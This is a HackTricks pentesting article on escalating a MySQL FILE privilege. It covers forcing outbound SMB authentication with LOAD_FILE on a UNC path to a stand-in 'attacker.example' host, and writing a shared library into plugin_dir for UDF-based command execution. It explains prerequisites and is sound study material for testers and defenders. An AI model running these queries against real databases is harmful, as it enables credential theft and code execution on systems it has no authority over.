---
title: "MySQL File priv to SSRF/RCE"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/sql-injection/mysql-injection/mysql-ssrf.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

# MySQL `FILE` Privilege to Outbound SMB and RCE

`FILE` Privilege to Outbound SMB and RCE

## UNC-path requests through `LOAD_FILE()`

`LOAD_FILE()`
`LOAD_FILE()` reads a file from the database server’s host. It requires the MySQL `FILE` privilege, an absolute path, operating-system access for the `mysqld` account, and a path allowed by `secure_file_priv`.[\[2\]](#references)

`secure_file_priv` is platform- and build-dependent: a directory confines file operations to that directory, an empty value (`""`) imposes no path restriction, and `NULL` disables the relevant import/export operations. Do not assume `/var/lib/mysql-files/` is universal; query the live value:[\[2\]](#references)

```
SELECT @@global.secure_file_priv;
SELECT LOAD_FILE('C:\\Windows\\win.ini');
```
On Windows, a UNC path can make the host attempt SMB authentication to a remote server over TCP port 445. This is better described as an outbound SMB/credential-leak primitive than general-purpose SSRF: the destination port is not freely selectable, and the request is not arbitrary HTTP.[\[1\]](#references)

```
SELECT LOAD_FILE('\\\\attacker.example\\share\\file');
```
If the account running `mysqld` can authenticate to and read the remote share, `LOAD_FILE()` may return the remote file’s bytes. Even when the file read fails, the SMB authentication attempt may still expose a challenge-response value to the listening server.[\[1\]](#references)

## Loadable-function path to code execution

MySQL loadable functions (historically called UDFs) execute native code from a shared library. A library registered with `CREATE FUNCTION ... SONAME` must reside in the directory identified by `plugin_dir` on supported MySQL versions.[\[3\]](#references)

The location rule is version-sensitive. MySQL 5.0.67 introduced `plugin_dir` for UDF loading: when it is nonempty, the library must be stored there; on older releases, or when that legacy variable is empty, the server searches directories known to the system’s dynamic linker.[\[7\]](#references)

An SQL-injection path becomes code execution only if several independent conditions hold: the database account can write a compatible shared library, file writes can reach `@@plugin_dir`, the account can register the function, and the operating system permits `mysqld` to load it. MySQL explicitly warns that a writable plugin directory combined with the `FILE` privilege may allow executable code to be installed.[\[4\]](#references)

Where those prerequisites hold, the library bytes can be represented as a hexadecimal SQL literal and written without formatting by using `SELECT ... INTO DUMPFILE`. The destination must satisfy `secure_file_priv`, must not already exist, and is created under the operating-system account that runs `mysqld`.[\[5\]](#references)

```
SELECT 0x<hex-encoded-library> INTO DUMPFILE '<plugin_dir>/library_name.so';
```
```
SELECT @@plugin_dir, @@global.secure_file_priv;
SHOW GRANTS;
```
SQLMap supports custom UDF injection through `--udf-inject` and `--shared-lib`, but its result still depends on these database, filesystem, architecture, and operating-system prerequisites.[\[6\]](#references)

Libraries such as `lib_mysqludf_sys` expose operating-system command execution; an operator can also build a purpose-specific UDF that makes network requests. For blind injection, the original research discusses out-of-band recovery through UNC/SMB or DNS-capable primitives when the target operating system and network policy allow them.[\[1\]](#references)

## References
